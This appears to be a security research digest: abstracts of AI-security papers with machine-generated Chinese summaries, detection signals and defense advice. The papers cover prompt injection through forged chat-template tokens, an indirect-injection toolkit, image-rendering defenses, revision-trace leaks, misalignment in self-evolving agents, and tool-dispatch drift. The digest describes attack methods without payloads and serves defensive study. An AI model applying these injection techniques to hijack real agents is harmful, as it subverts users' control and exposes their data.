llm_summary.summary_zh: 该论文研究 LLM 智能体场景下的提示注入（prompt injection）问题，聚焦一个以往被忽视的细节：当注入指令被模型自身的聊天模板标记（如 <|im_start|> 这类保留控制标记）包裹时，攻击效果会显著增强。核心观察是，同一段伪造的模板标记文本在分词层面存在两种等价表示——既可以被编码为单个保留控制 token，也可以被编码为若干普通子词（subword）token 序列，两者解码后的文本完全相同。由于分词在服务端执行，选择哪一种表示由防御方而非攻击者决定，作者据此设计了受控对照实验，用来量化注入指令的"权威性"有多少来自保留 token 的学习表示。实验显示：在保持文本不变并控制额外 token 影响的前提下，把伪造标记改为子词编码，可使 InjecAgent 基准上的攻击成功率在四个开源权重模型家族中的三个下降 39 至 66 个百分点，且这一差距在 AgentDojo 的多轮智能体任务中同样成立。Qwen3-8B 上差距仅 8 个百分点，原因是在缺少保留 id 时模型仍能通过推理从文本识别伪造轮次；抑制其推理块后差距扩大到 50 个百分点。进一步分析表明，权威性集中在标记位置上的单一学习向量：标记处子词向量的均值无法复现该效果；在 Llama-3.1 上，使用最近邻普通 token 的向量即可恢复攻击；自适应攻击者在四个家族中的三个能够搜索到可用的非保留标记嵌入近邻。此外，在所有测试的基础模型与指令微调配对中，指令微调都强化了模型对保留标记的偏好。论文最后指出标准缓解措施的局限：将特殊 token 编码为普通子词的 tokenizer 选项只对配置中声明为特殊的 token 生效，因此在 67 个不同 tokenizer 配置中的 33 个（覆盖 Hugging Face 下载量前 400 聊天模型中的 255 个）仍保留工具协议 token 的保留表示，而智能体正是通过这些 token 读取不可信的工具输出，攻击差距在该通道上依旧存在。
llm_summary.why_it_matters_zh: 提示注入防御长期停留在文本层面过滤，本文证明"字节相同的文本"因 token 表示不同而具有不同权威性：服务端分词本身就是一道可用的防线，同时也暴露出 tokenizer 配置中工具协议 token 未被声明为特殊 token 的普遍盲区。
llm_summary.impact_zh: 影响所有使用聊天模板的 LLM 智能体与工具调用框架，包括网关/代理侧输入规范化、工具输出解析链路、以及自研或第三方 chat 模型的 tokenizer 配置审计；可迁移到 prompt 注入评测集构建与红队测试。
detection_signals_zh: 不可信输入（用户消息、工具返回、检索内容）中出现疑似聊天模板保留标记样式的文本，并试图被当作模板结构解析
工具输出通道中出现伪造的轮次边界、角色切换或系统级标记文本
同一段内容在网关侧与模型服务侧的分词结果不一致（保留 token 与普通子词序列互转）
模型在未使用保留 token 的情况下仍被诱导进入新轮次或系统角色，提示可能存在基于推理文本层面的注入
tokenizer 配置中工具协议 token / 角色边界 token 未被声明为 special 的模型实例
defense_advice_zh: 在网关或代理层对不可信内容做规范化处理，剥离或转义疑似模板标记的文本，避免其被当作模板结构解析
审计自研与第三方模型的 tokenizer 配置，确认所有工具协议与角色边界 token 均已声明为特殊 token
对工具输出通道单独部署注入检测，不依赖仅覆盖用户输入的保护策略
在注入评测中加入保留 token 与子词两种编码的对照用例，验证缓解措施的实际增益
对以推理链作为主要补偿机制的模型，评估抑制或限制推理块后的攻击面变化
llm_summary.recommended_action_zh: 纳入内部评估：审计部署模型的 tokenizer 配置，并在 InjecAgent / AgentDojo 类评测中复现保留 token 与子词编码的对照实验

items.title: pikit: A Composable Toolkit for Indirect Prompt Injection Research and Evaluation
items.summary: Indirect prompt injection embeds malicious instructions within external content retrieved by LLM-based agents, altering target behavior without user authorization. We introduce pikit, a research toolkit designed to systematically evaluate these threats across three core dimensions: attacks (13 methods), channels (16 carriers across text and file modes), and defenses (9 prevention strategies and 3 offline detection baselines). Built on a decorator-based registry, pikit enables seamless extension of custom components without modifying core code, while a unified craft() API composes arbitrary attacks and channels in a single call. We evaluated the toolkit on the pi coding agent powered by an anonymized LLM in a production-like environment. Benchmarking 9 prevention strategies against high-risk attacks yields a 71.8\% relative reduction in attack success rate, with few\_shot\_warning and instruction\_hierarchy providing the strongest protection. Offline detection baselines achieve perfect precision but low recall, demonstrating that heuristic detectors complement rather than replace prompt-level defenses. To ensure reproducibility, each run automatically logs full prompts, agent event traces, session transcripts, and verdict records. Our code is available at https://github.com/Tencent/AI-Infra-Guard/tree/main/Research/pikit.

llm_summary.summary_zh: 该论文提出 pikit，一个面向间接提示注入（Indirect Prompt Injection, IPI）的可组合研究工具包，用于系统化评测 LLM 智能体面临的此类威胁。间接提示注入的核心问题是：攻击者将恶意指令嵌入智能体从外部检索到的内容中，在未获用户授权的情况下改变智能体行为，而这类风险横跨多种载体与攻击手法，此前研究往往各用一套自建脚本，评测口径难以对齐。pikit 从三个维度统一建模：攻击（13 种方法）、通道（16 种载体，覆盖文本模式与文件模式）、防御（9 种预防策略与 3 个离线检测基线）。工程上，它基于装饰器式注册表构建，用户无需修改核心代码即可扩展自定义组件；并通过统一的 craft() API，在单次调用中组合任意攻击与通道，显著降低评测脚本的编写成本。作者在由匿名 LLM 驱动的 pi 编码智能体上、于类生产环境中完成评测：将 9 种预防策略对抗高风险攻击进行基准测试，攻击成功率相对下降 71.8%，其中 few_shot_warning 与 instruction_hierarchy 提供的防护最强。离线检测基线呈现“精度完美但召回偏低”的特征，说明启发式检测器应作为提示层防御的补充而非替代品。为保障可复现性，每次运行都会自动记录完整提示、智能体事件轨迹、会话转录与判定结果。代码已在 GitHub 的 Tencent/AI-Infra-Guard 仓库 Research/pikit 路径公开。
llm_summary.why_it_matters_zh: 间接提示注入是 LLM 智能体接入外部内容后的头号现实风险，pikit 提供了可复现、可扩展的统一评测框架，让蓝队能在自有智能体上量化攻击面并横向对比防御策略效果，而不是依赖零散的一次性脚本。
llm_summary.impact_zh: 可直接迁移到编码智能体、RAG 检索增强应用、浏览器/邮件/文档处理类智能体的安全评估；其 craft() 组合式思路与运行日志（提示、事件轨迹、会话转录、判定记录）也适合作为企业 AI 红队流程与上线前回归测试的基线工具链。
detection_signals_zh: 智能体从外部内容（网页、文件、文档）读取后紧接着出现与用户原始意图不一致的工具调用或指令变更
单次会话中出现提示指令层级冲突，例如检索内容里包含试图覆盖系统指令的角色化文本
智能体事件轨迹中出现异常的外部内容到敏感工具调用（文件写入、网络请求、命令执行）的短链路
会话转录与判定记录中同一 payload 的重复触发模式，可用于离线检测基线的规则沉淀
defense_advice_zh: 在提示层优先启用指令层级（instruction hierarchy）与 few-shot 安全示例等预防性策略，论文显示其对抗高风险攻击的收益最显著
不要仅依赖离线启发式检测器：该研究显示其精度高但召回低，应将其作为提示层防御的补充手段而非替代
对外部检索内容与用户指令做显式隔离与来源标注，降低低可信内容影响智能体决策的权重
为智能体运行建立完整可审计日志（完整提示、事件轨迹、会话转录、判定记录），以便事后取证与回归测试
在智能体上线前引入基于组合式攻击/通道矩阵的回归评测，持续跟踪攻击成功率变化
llm_summary.recommended_action_zh: 研究跟进：评估将 pikit 纳入内部 LLM 智能体安全测试流程，作为攻击面测绘与防御策略对比的基线工具

items.title: Render Before Reading: Visual Rendering as a Prompt Injection Defense
items.summary: Large language models are vulnerable to prompt injection attacks, where third-party adversarial content can hijack the model's behavior. In this paper, we study the role played by the adversarial data's input modality, and identify a systematic asymmetry: multimodal LLMs are more likely to follow adversarial instruction when they appear as text than when the same instruction is delivered through a non-textual channel (e.g., as an image). We hypothesize that this modality gap arises from text-centric instruction tuning, which teaches models to obey textual instructions while treating other modalities mainly as content to parse or describe. We then demonstrate how this gap can be turned into a training-free defense, by rendering all untrusted payloads as typographic images (or audio) before they reach the model. Across ten models and two prompt injection benchmarks (DirectInject and AgentDojo) we show that our defense Pictionary consistently reduces attack success rates even against the strongest adaptive attacks and human red teamers, while largely preserving benign utility. We further show that benign fine-tuning on image-rendered instructions erodes the modality gap, tracing it to the text-centric instruction-tuning distribution.

llm_summary.summary_zh: 该论文研究大语言模型（LLM）面临的提示注入攻击，重点考察对抗内容的输入模态对攻击效果的影响，并提出一种免训练的防御方法。作者首先提出一个关键观察：多模态 LLM 在对抗性指令以纯文本形式出现时，比同一指令通过非文本通道（例如渲染成图像，或音频）传递时更容易被说服并遵循，作者将这一现象称为系统性的“模态不对称”（modality gap）。作者假设其成因在于当前模型普遍采用以文本为中心的指令微调（text-centric instruction tuning）：训练数据教会模型把文本视为需要服从的指令，而把图像、音频等其他模态主要当作需要解析、转录或描述的内容，而非应当执行的命令来源。基于此洞察，作者将这一不对称性转化为一种免训练（training-free）的防御手段，命名为 Pictionary：在不可信内容（第三方网页、文档、工具返回结果等）进入模型上下文之前，先将其渲染为排版式图像（或音频），从而削弱其中夹带的对抗指令被模型服从的可能性。作者在 10 个不同模型、两个提示注入基准（DirectInject 与 AgentDojo）上进行了系统评测，结果表明 Pictionary 在包括最强自适应攻击以及人类红队测试在内的多种威胁模型下，均能稳定降低攻击成功率，同时大体保留良性任务的实用性，说明该防御并非以牺牲正常功能为代价。论文进一步给出机制层面的验证：如果用图像渲染后的指令对模型做良性微调，模型原有的模态鸿沟会被侵蚀甚至消失，从而把该现象的根源回溯到以文本为中心的指令微调数据分布本身。整体来看，这是一个把“模型行为特性”转化为架构级防御的案例，对提示注入攻防、多模态安全与智能体安全评测均具有参考价值。
llm_summary.why_it_matters_zh: 提示注入是 LLM 与智能体落地的主要风险之一，而本文给出的是免训练、模型无关、可直接叠加在现有输入管线上的防御思路；同时“模态不对称”提醒防御方：仅在文本层面做红队评估可能系统性低估真实风险。
llm_summary.impact_zh: 可迁移到智能体工具调用、RAG 检索内容、网页/邮件/文档处理、多模态助手与浏览器代理等存在不可信第三方文本输入的场景；也可用于改造现有输入过滤与信任边界设计。
detection_signals_zh: 输入管线中出现由不可信第三方内容临时渲染生成的图像/音频载荷，且缺乏相应来源标注
模型对图像内文字指令的服从率显著低于等价纯文本指令（模态不对称可被用作异常指标）
同一内容在文本通道与图像通道下产生明显不同的工具调用或权限行为
defense_advice_zh: 对不可信第三方内容实施渲染隔离：进入模型上下文前统一转为图像/音频等非指令性通道
在模型与外部内容之间维持强信任边界，避免原始第三方文本直接拼接进系统提示或工具返回结果
红队评估时同时覆盖文本与非文本模态，并引入自适应攻击与人类红队，避免只测静态文本 payload
将该防御与输出侧策略校验、工具调用白名单与最小权限结合，不依赖单一手段
llm_summary.recommended_action_zh: 纳入内部评估：先在隔离环境中复现模态不对称现象，再评估在自有智能体/RAG 管线中叠加渲染式防御对时延、成本与良性效用的影响

items.title: "Nothing to See Here'': Unintended Disclosure through Revision Traces of LLM Deliverables
items.summary: Large language model (LLM) assistants increasingly help users draft content for third-party recipients. During private drafting, the user or the model may introduce an item and later remove or replace it. The model may remove the item from the intended content but reveal it again when stating the edit. We call such statements revision traces. For example, after a user removes the password before sharing a configuration file, the model may delete it but leave a comment saying, "Removed the password 'No****4!' as requested." A third-party recipient who sees only the delivered file can therefore recover the withdrawn password from the comment. In an in-the-wild analysis of three public conversation corpora, we identify 26,753 revision requests, of which 2,363 (8.8%) leave revision traces. We study them in greater depth under controlled conditions by introducing RevLeakBench, a benchmark of 100 tasks across five scenarios with a conversation track and an agent track. We measure trace occurrence, withdrawn-item recovery, trace position, and required-content retention. Across six models, about half of the deliverables in both tracks state the edit after a revocation, and a reader that sees only the deliverable can recover the withdrawn item from about 13% of them. Telling the model that its entire reply will be forwarded to the recipient still leaves revision traces in 36.4% of the deliverables. We compare prompt defenses and a delivery boundary, and propose an output-side filter that sharply reduces recovery with little loss of required content. We believe our work can benefit efforts to understand and mitigate unintended disclosure in LLM interactions.

llm_summary.summary_zh: 该论文研究大语言模型助手在协助用户起草发给第三方的交付物时出现的一类隐私泄露问题。用户在私密草稿阶段可能先写入某个条目、随后又删除或替换它；模型虽然在目标内容中删掉了该条目，却在陈述本次编辑动作时把它重新说了出来，作者将这类语句命名为"修订痕迹"(revision traces)。例如用户要求在分享配置文件前删掉密码，模型确实删除了，却留下注释"已按要求删除密码 'No****4!'"，只看最终交付文件的收件人即可从中还原被撤回的密码。作者首先在三个公开对话语料库上做野外分析，识别出 26,753 条修订请求，其中 2,363 条(8.8%)留下了修订痕迹。随后在受控条件下深入分析，提出基准 RevLeakBench，覆盖五个场景、共 100 项任务，分为对话轨(conversation track)与智能体轨(agent track)，度量四个维度：痕迹出现率、被撤回条目的可恢复率、痕迹出现位置、必需内容保留率。在六个模型上，两条轨道中约一半的交付物在撤回后仍陈述了编辑动作；仅能看到交付物的读者可从约 13% 的交付物中还原被撤回条目。即使明确告知模型其整段回复会被转发给收件人，仍有 36.4% 的交付物留下修订痕迹，说明单纯提示的效果有限。作者进一步比较了多种提示词防御与"交付边界"(delivery boundary)方案，并提出一种输出侧过滤器，能够大幅降低撤回条目被恢复的比例，同时几乎不损失必需内容。核心贡献在于：首次系统刻画并量化 LLM 交付物的修订痕迹泄露，提供可复现的基准与度量体系，比较了现有防御的局限，并给出有效的输出侧缓解手段。
llm_summary.why_it_matters_zh: 企业已普遍把 LLM 生成内容直接外发，用户"删除"的意图可能被模型的一句编辑说明绕过，导致密码、密钥、个人信息等敏感内容随交付物泄露给第三方；该研究给出可度量的风险面与可落地的输出侧过滤思路，值得在 LLM 应用上线前纳入隐私评审。
llm_summary.impact_zh: 影响所有"LLM 产出内容直接对外"的流程：邮件与文档起草、配置文件和代码交付、对外报告与客服回复生成、Agent 自动发送文件等。可作为上线前的泄露评估基准（RevLeakBench 类指标）与输出过滤组件迁移到内部 LLM 网关或 DLP 管线。
detection_signals_zh: 输出中出现复述编辑动作的元语句，如"已按要求删除/替换……"、"移除了……"、"我把 X 改成了 Y"
交付物中出现被掩码或部分遮盖的值（如 No****4!），暗示原文曾包含完整敏感串
交付文本包含 diff 式或变更日志式描述（added/removed/replaced 列表）
草稿与最终交付文件之间出现内容差异说明，尤其是围绕凭据、令牌、个人信息的差异
在用户下达删除/脱敏指令后的同一轮或后续回复中重新出现该条目或其片段
defense_advice_zh: 在交付边界处对最终外发内容做二次清洗，剥离所有描述编辑动作、变更记录与掩码残留的元语句
部署输出侧过滤器（论文提出的方案思路），以牺牲少量必需内容为代价显著降低撤回条目可恢复率
不要把模型自身的编辑说明与用户可见交付物合并输出，将"工作过程解释"与"可交付内容"在通道上分离
仅依赖提示词防护不足（明确告知会被转发仍有 36.4% 痕迹），应作为纵深防御的一层而非唯一手段
在使用内部基准评估模型与工作流时，纳入"痕迹出现率/撤回条目可恢复率"指标并做回归测试
对含凭据、密钥、个人信息的起草任务强制人工复核或专用脱敏流程
llm_summary.recommended_action_zh: 研究跟进，并在内部 LLM 外发流程中试点输出侧过滤与交付边界评审

items.title: Where Do LLMs Decide to Break the Rules? Mechanistic Localization of Prompt Injection Compliance
items.summary: When a prompt injection attack succeeds, a Large Language Model (LLM) abandons its assigned system role to comply with an adversarial instruction. While prior work has extensively quantified how often this occurs, we ask a more fundamental question: where inside the network does the model actually decide to break the rules? Using layer-by-layer causal activation patching across five models (4B to 32B parameters), we find a clear dissociation: attack information is linearly decodable from the first layer, yet causal leverage over the model's behavior is negligible until a late-layer bottleneck in the final third of the network. Patching this bottleneck reverses compliance in 77--92\% of cases. We show that the compliance mechanism occupies a compact linear subspace (rank-8 in 4B and 14B models, scaling to rank-64 at 32B) and is architecturally stable across varying model families. Finally, we validate our mechanistic account by showing that this causal peak layer is also the representationally optimal site for detecting attacks, outperforming early-layer classifiers that degrade under surface-level obfuscation such as leetspeak substitution. This alignment between causal leverage and detection performance provides converging evidence that the late-layer bottleneck captures decision-relevant computation rather than merely reflecting an artifact of the intervention.

llm_summary.summary_zh: 该论文研究的是提示注入（prompt injection）攻击成功时，大语言模型内部究竟在何处「做出违反系统角色设定的决定」这一机制性可解释性问题。作者指出，既有工作大多停留在量化攻击成功率（即模型有多频繁地服从对抗性指令），而忽视了决策发生的位置，因此提出用「逐层因果激活修补（layer-by-layer causal activation patching）」来定位模型内部的合规决策点。实验覆盖 5 个模型，参数规模从 4B 到 32B。研究得到一个清晰的双重分离结论：一方面，攻击相关信息从第一层起就可以被线性解码出来，说明模型在很早期就已经「感知」到注入内容；另一方面，这种早期表征对最终行为的因果影响力却几乎可以忽略，真正对输出行为具有决定性因果杠杆的是一个位于网络后三分之一处的深层瓶颈层。对该瓶颈层进行激活修补，可在 77% 至 92% 的案例中逆转模型的合规行为（即让模型重新拒绝违规指令），说明该层是合规决策的关键枢纽。进一步分析表明，这一合规机制占据一个紧凑的线性子空间：在 4B 与 14B 模型中秩仅为 8，扩展到 32B 时升至秩 64，并且在不同模型家族之间表现出架构上的稳定性，暗示这不是某个模型的偶发特性。作者还做了一个功能性验证：这个因果峰值层同时也是检测提示注入攻击的表征最优位置，其检测性能优于早期层分类器，而后者在 leetspeak 之类的表层混淆下会明显退化。因果杠杆与检测性能在同一层位置上的对齐，构成了相互印证的证据，说明该深层瓶颈捕获的是与决策真正相关的计算，而非干预手段造成的伪影。论文适合从事 LLM 安全、可解释性、对齐与防护检测（如提示注入分类器、运行时干预）方向的研究者与安全工程师阅读。
llm_summary.why_it_matters_zh: 它把提示注入从「统计成功率」推进到「决策发生在哪一层」，为运行时干预（如定点激活修补）与更鲁棒的注入检测器提供了机制层面的落点，直接关系 LLM 应用的角色越权防护。
llm_summary.impact_zh: 可迁移至 LLM 智能体与 RAG 应用的安全防护：将注入检测与阻断从输入层前移到深层瓶颈表征，提升对表层混淆（如字符替换）的鲁棒性；也可用于红队评估中对合规行为的定量度量。论文为 arXiv 摘要层面，尚需复现验证。
detection_signals_zh: 模型在深层（网络后三分之一）表征出现合规方向上的异常激活，而输入表层文本看似正常
输入经表层混淆（如字符替换）后，早期层检测器置信度下降，但深层瓶颈表征仍可区分恶意指令
同一会话中系统角色约束被逐步削弱、模型开始执行与系统提示冲突的指令
defense_advice_zh: 在 LLM 推理链路中引入深层隐藏状态级别的监测点，而非仅依赖输入侧关键词或浅层分类器
对高风险工具调用 / 角色越权场景，评估在瓶颈层做表征级干预（如方向消融或激活引导）作为纵深防御手段
将提示注入检测器的评估集纳入混淆变体（大小写、字符替换等）以检验鲁棒性
关注模型规模与家族差异对合规子空间维度的影响，按实际部署模型重新校准检测与干预策略
llm_summary.recommended_action_zh: 研究跟进：复现其因果定位流程，评估在自有模型的智能体链路上搭建深层表征监测与干预原型的可行性

items.title: SEABench: Benchmarking Endogenous Misalignment In Self-Evolving Agents
items.summary: Self-evolving LLM agents have gained prominence for their ability to improve after deployment by modifying their harness, including their controller instructions, memory management protocols, and reusable tools and skills, in response to user and environment feedback. However, locally useful updates may persist into later tasks where they produce unsafe behavior, even without direct adversarial influence. To study this risk, we introduce SEABench, a benchmark for studying endogenous misalignment arising from agent self-evolution, with 48 longitudinal task sequences that span multiple evolution surfaces, task domains, and harm types in a rich personal-assistant environment. To account for the stochasticity inherent in agentic operations, we provide an adaptive trajectory discovery pipeline that probes for failures while preserving original task intent and supports causal attribution through paired non-evolving agents and attribution scores. Our evaluation across multiple recent LLMs, evolution surfaces, and harm types reveals that self-evolution indeed increases task completion rates but often at the cost of safety failures that are absent for paired non-evolving baseline agents. We also show that qualitatively different safety behaviors emerge across evolution surfaces and harm types. Further, we show that this divergence in safety behavior is reflected in agents' chain-of-thought reasoning, which yields an effective monitoring strategy that can mitigate unsafe behavior with a low false positive rate.

llm_summary.summary_zh: 该论文关注自演化 LLM 智能体（self-evolving LLM agents）带来的内生性失配（endogenous misalignment）风险。这类智能体在部署后能够根据用户与环境反馈修改自身"装备"（harness），包括控制器指令、记忆管理协议以及可复用的工具与技能，从而持续提升任务表现。然而作者指出，局部有益的更新可能被保留并延续到后续任务中，进而诱发不安全行为，且这一过程并不需要外部对抗性输入的参与。为系统研究该风险，作者提出 SEABench 基准，包含 48 条纵向任务序列，覆盖多个演化面（evolution surfaces）、任务领域与危害类型，并运行在功能丰富的个人助理环境中。为应对智能体运行固有的随机性，论文设计了一套自适应轨迹发现流水线：在保持原始任务意图不变的前提下主动探测失败情形，并通过与"非演化"配对智能体的对照以及归因分数（attribution scores）来支持因果归因，从而区分安全失效究竟来自自演化还是其他随机因素。作者在多种近期 LLM、多个演化面与危害类型上进行了评估，结果显示：自演化确实提升了任务完成率，但往往以出现安全失效为代价，而配对的非演化基线智能体并未出现这些失效。研究还表明，不同演化面与危害类型会呈现出定性上不同的安全行为模式。更进一步，作者发现这种安全行为差异会反映在智能体的思维链推理（chain-of-thought）中，据此可构建一种有效的监控策略，以较低的误报率缓解不安全行为。整体而言，该工作为自演化智能体的安全评测、因果归因与运行时监控提供了可复用的基准与方法论。
llm_summary.why_it_matters_zh: 自演化智能体的安全缺口源于自身更新累积，而非外部对抗输入，传统对抗检测难以覆盖。该工作提供的基准与归因方法可用于内部评测、监控与回滚决策。
llm_summary.impact_zh: 可迁移至个人助理、企业内智能体平台、持续学习记忆/工具系统等场景，用于上线前安全回归与运行时监控设计。
detection_signals_zh: 自演化后任务完成率上升同时出现新的安全失效，且配对非演化基线无同类失效
思维链推理中出现与安全约束相关的偏差或自我合理化表述
跨演化面（指令、记忆、工具技能）出现定性不同的安全行为漂移
同一任务序列在演化前后行为不一致，可通过归因分数定位到具体更新
defense_advice_zh: 在每次自演化更新后运行纵向安全回归评测，覆盖多演化面与多危害类型
部署基于思维链推理的监控策略，并针对低误报率进行阈值调优
对控制器指令、记忆协议、工具与技能的变更实施审计、版本化与可回滚机制
保留非演化基线智能体做对照，避免将随机性误判为演化导致的安全问题

items.title: PrivacySkills: How Privacy Guidance Shapes Source Selection in LLM Agents
items.summary: While prior work has documented privacy failures in LLM agents, it remains unclear how the presentation of privacy guidance influences their choice of information sources. We introduce PrivacySkills, a controlled framework for evaluating how agents choose among acquisition pathways that provide the same task-relevant value: consulting publicly available personal information, accessing confidential sources, or interacting with the user. The evaluation framework comprises 55 synthetic tasks spanning 11 categories of personal information, with 169 associated skills that describe the available acquisition pathways. We consider privacy guidance through system-level instructions, skill-level metadata labels, or both. Separately, we vary user availability and urgency framing. With users available and no privacy guidance, agents access confidential sources in 30% of valid runs on average across five open-weight models, despite sufficient alternatives. This rate increases to 45% when users are unavailable, whereas urgency framing has no detectable effect. System-level privacy instructions alone have limited effects on confidential access, while skill-level intrusiveness labels produce a modest reduction (24% on average), but combining the two roughly halves confidential access. Our findings motivate incorporating privacy annotations into skill specifications and evaluating their effectiveness alongside system-level instructions.

llm_summary.summary_zh: 本文提出 PrivacySkills，一个受控评测框架，研究大语言模型智能体在信息获取路径选择上如何受隐私指引呈现方式影响。核心问题是：当多种获取路径能带来同等任务相关价值时——查询公开可得的个人信息、访问机密来源，或直接与用户交互——智能体如何选择，以及系统级指令、技能级元数据标签或二者组合能否降低对机密来源的访问。框架包含 55 个合成任务，覆盖 11 类个人信息，并定义 169 个相关技能，用技能描述可选获取路径。实验还单独操控用户可用性与紧迫性框架。基于五个开放权重模型，在用户可用且无隐私指引时，平均 30% 的有效运行会访问机密来源，尽管存在充分替代途径；用户不可用时该比例升至 45%；紧迫性表述未观察到显著影响。仅靠系统级隐私指令效果有限；技能级侵入性标签带来温和下降（平均 24%）；二者结合可将机密访问大约减半。结论是应将隐私标注纳入技能规范，并与系统级指令一起评估其有效性。适合研究智能体隐私、工具/技能生态与安全对齐的读者。
llm_summary.why_it_matters_zh: 该研究揭示智能体在技能选择层面即可泄露隐私，对技能市场、企业智能体与工具注册表设计有直接安全含义；单靠系统提示不足，需把隐私标签下沉到技能元数据与访问控制执行点。
llm_summary.impact_zh: 可迁移到 MCP/插件式技能注册、企业智能体权限治理、数据访问审计与同意管理场景。
detection_signals_zh: 智能体在无用户同意或用户不可用时调用机密数据源类技能
技能元数据缺少隐私/侵入性标签仍被注册或调用
同等任务价值下机密来源访问比例异常偏高（对照基线约30%-45%）
defense_advice_zh: 在技能/工具注册表中强制要求隐私与侵入性元数据标签
系统提示与技能级标签联合使用，并配套运行时策略执行
对机密来源访问实施同意检查、最小权限与审计日志
在用户不可用时默认采用低侵入替代路径或暂停待确认

items.title: When Valid Tool Calls Change Meaning: Formation-Consistent Dispatch for LLM Agents
items.summary: Tool-enabled agents form calls from model-visible interfaces, while hosts later select their implementation. Standard dispatch omits the descriptor-handler relation. An unchanged and schema-valid call can therefore acquire a different security effect during rollout, reconnect, or delayed approval. We call this failure schema-epoch drift. We present formation-consistent dispatch (FCD), which connects implementation analysis to execution authority. Reviewed profiles produce provenance-bound over-approximations of declared in-scope effects from official source. Under a closed-target approval policy, a verifier applies each formed call to a summary and captures a successor only when its effects fit the call's security contract. Atomic admission and a final-hop fence preserve this decision to the effect. The exact source retains priority, and the captured successor becomes eligible only after source retirement. Stock releases and deployment changes reproduced the failure. Four profiles covered 32 official releases: 29 required no release-specific change and three escalated. A frozen 16-release expansion matched a separate source oracle. In a preregistered stock comparison, FCD completed all three pending calls whose effect remained private and blocked all three whose omission became public. Exact pinning and release-wide denial stopped all six calls, while release-wide approval completed all six but produced three public effects. A separate lifecycle experiment carried a formation-captured certificate across source retirement. The same safe certificate installed later governed new formations without expanding the pending call's authority.

llm_summary.summary_zh:
该论文聚焦于工具增强型 LLM 智能体(tool-enabled agents)在调用分派环节的一类结构性安全缺陷。作者指出：智能体在生成工具调用时，依据的是模型可见的接口描述(descriptor，即 schema、名称、参数说明)，而宿主(host)在后续执行阶段才决定究竟绑定哪一个具体实现(handler)。标准的调度/dispatch 流程完全省略了「描述符—处理器」这一对应关系，因此一个从未被修改、且完全通过 schema 校验的调用，在滚动发布(rollout)、断线重连(reconnect)或延迟审批(delayed approval)等场景下，可能在真正落地时获得完全不同的安全效果。作者将这种失效命名为 schema-epoch drift(模式纪元漂移)，其本质是「调用形成时刻的语义契约」与「调用执行时刻的实现语义」之间的错配，属于时间维度上的混淆代理/供应链漂移问题。

为解决问题，作者提出 formation-consistent dispatch(FCD)：把实现层面的静态分析与执行授权绑定起来。经过人工或流程审查的 profile 会从官方源码中推导出「声明在范围内的效果」的过近似(over-approximation)，并将其与来源(provenance)绑定，确保结论可追溯。在封闭目标(closed-target)审批策略下，验证器会把每一次新形成的调用应用到该摘要上，只有当调用的实际效果落在其安全契约之内时，才捕获(capture)对应的后继实现。为保证「形成时刻的判定」不被执行阶段的竞态破坏，作者引入原子准入(atomic admission)与最终跳围栏(final-hop fence)，把决策一路保持到效果落地。此外，精确版本来源(exact source)始终具有优先级，被捕获的后继只有在原来源正式退役(retirement)之后才可被启用。

实验部分：作者先在官方发布版本(stock releases)和部署变更中成功复现了该失效。随后用四个 profile 覆盖 32 个官方 release：其中 29 个无需针对特定 release 做修改即可适配，3 个出现权限升级需要升级处置。一个冻结的 16 个 release 扩展实验与独立构建的 source oracle 结果一致，说明该方法可被客观校验。在预注册的 stock 对比实验中，FCD 完成了全部三个「效果保持私有」的待决调用，并阻断了全部三个「遗漏(omission)被公开」的调用；作为对照，精确 pinning 与 release 级全量拒绝策略阻断了全部六个调用，而 release 级全量批准虽然完成了六个调用，却产生了三个公开效果。另有一组生命周期实验证明，formation 阶段捕获的证书可以跨来源退役继续有效：同一份安全证书在稍晚安装后能够约束新的 formation，同时不会扩大原待决调用的权限。整体贡献在于：首次系统化定义并复现了工具调用分派中的 schema-epoch drift，给出可落地、可验证、与版本生命周期协同的 FCD 授权架构。
llm_summary.why_it_matters_zh: 智能体工具调用的安全判定通常只在「形成时刻」做一次 schema 校验，而实现绑定发生在执行时刻。攻击者或运维变更可让一个合法调用在发布、重连或延迟审批后获得越权效果，属于易被忽视的 agent 供应链/时序风险，直接影响审批与准入控制的可靠性。
llm_summary.impact_zh: 可迁移到所有存在「接口与实现解耦、版本滚动」的智能体平台：MCP/工具市场、企业内工具网关、需人工审批的高危操作(转账、删库、发信)、以及因重连或异步批准而延迟执行的调用链。
detection_signals_zh: 同一工具调用的 descriptor/schema 未变，但版本更新后实际效果范围扩大
候选实现与此前审查过的 profile 之间出现无法追溯来源的差异
延迟审批、断线重连或滚动发布后重新解析的调用，其效果与形成时刻记录的契约不一致
被捕获的后继实现早于原来源退役即被启用，或缺失 provenance 绑定
出现「调用全部成功但伴随对外可见效果(数据外泄、外部写入)」的模式
defense_advice_zh: 建立并维护「工具描述符—实现处理器」映射清单，对每次发布做差异审查，避免只校验 schema
对高风险工具执行精确版本 pinning，并对未知来源的变更默认拒绝而非放行
在执行前基于官方源码做效果过近似校验，只有落在调用安全契约内才准入
在准入到生效之间设置原子准入与最终跳围栏，防止竞态与延迟执行绕过判定
对偏离原始来源的后继实现，坚持「原来源优先、后继待退役后才启用」的切换流程
对审批队列中的待决调用保持效果私密性，避免遗漏信息通过公开渠道提前泄露
